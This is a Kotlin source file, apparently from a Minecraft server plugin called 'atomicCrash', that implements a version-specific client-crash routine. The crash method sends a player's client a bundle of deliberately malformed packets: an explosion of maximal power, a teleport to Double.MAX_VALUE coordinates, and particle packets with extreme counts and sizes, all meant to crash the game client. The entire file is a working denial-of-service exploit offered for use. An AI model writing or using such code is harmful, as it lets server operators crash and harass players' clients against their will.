package io.github.runkang10.atomicCrash.version

import io.github.runkang10.atomicCrash.shared.Version
import io.github.runkang10.atomicCrash.shared.VersionHeader
import io.github.runkang10.atomicCrash.shared.asServerPlayer
import net.minecraft.core.particles.ExplosionParticleInfo
import net.minecraft.core.particles.ParticleOptions
import net.minecraft.core.particles.ParticleTypes
import net.minecraft.network.protocol.Packet
import net.minecraft.network.protocol.game.*
import net.minecraft.server.level.ServerPlayer
import net.minecraft.sounds.SoundEvents
import net.minecraft.util.random.WeightedList
import net.minecraft.world.entity.PositionMoveRotation
import net.minecraft.world.phys.Vec3
import org.bukkit.entity.Player
import java.util.*

@Suppress("ClassName")
class NMS_26_3 private constructor() : Version {
    companion object : VersionHeader {
        override val supportedVersion = listOf("26.3")

        override fun new() = NMS_26_3()
    }

    private val vec3d = Vec3(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)

    private val positionMoveRotation by lazy {
        PositionMoveRotation(
            vec3d,
            vec3d,
            Float.MAX_VALUE,
            Float.MAX_VALUE
        )
    }

    private val weightedList by lazy {
        weightedListOf(
            ParticleTypes.ASH,
            ParticleTypes.BUBBLE,
            ParticleTypes.EXPLOSION,
            ParticleTypes.FIREWORK
        )
    }


    override fun crash(player: Player) {
        val serverPlayer = player.asServerPlayer()
        val connection = serverPlayer.connection

        val packets = generatePackets(serverPlayer, serverPlayer.position())
        packets.forEach { packet -> connection.send(packet) }
        connection.send(ClientboundBundlePacket(packets))
    }


    private fun generatePackets(
        player: ServerPlayer,
        center: Vec3,
    ): List<Packet<ClientGamePacketListener>> = listOf(
        ClientboundExplodePacket(
            center,
            Float.MAX_VALUE,
            Int.MAX_VALUE,
            Optional.of(vec3d),
            ParticleTypes.ASH,
            SoundEvents.GENERIC_EXPLODE,
            weightedList,
            true
        ),
        ClientboundTeleportEntityPacket(
            player.id,
            positionMoveRotation,
            emptySet(),
            true
        ),
        particlePacketOf(ParticleTypes.ASH, center),
        particlePacketOf(ParticleTypes.BUBBLE, center),
        particlePacketOf(ParticleTypes.CLOUD, center),
        particlePacketOf(ParticleTypes.ANGRY_VILLAGER, center)
    )

    @Suppress("SameParameterValue")
    private fun weightedListOf(vararg particles: ParticleOptions): WeightedList<ExplosionParticleInfo> {
        val weightedList = WeightedList.builder<ExplosionParticleInfo>()
        particles.forEach { particle ->
            weightedList.add(
                ExplosionParticleInfo(
                    particle,
                    1_000_000_000_000_000_000_000_000_000f,
                    Float.MIN_VALUE
                )
            )
        }

        return weightedList.build()
    }

    private fun particlePacketOf(
        type: ParticleOptions,
        vec3: Vec3
    ) = ClientboundLevelParticlesPacket(
        type,
        true,
        true,
        vec3.x,
        vec3.y,
        vec3.z,
        Float.MAX_VALUE,
        Float.MAX_VALUE,
        Float.MAX_VALUE,
        Float.MAX_VALUE,
        Int.MAX_VALUE
    )
}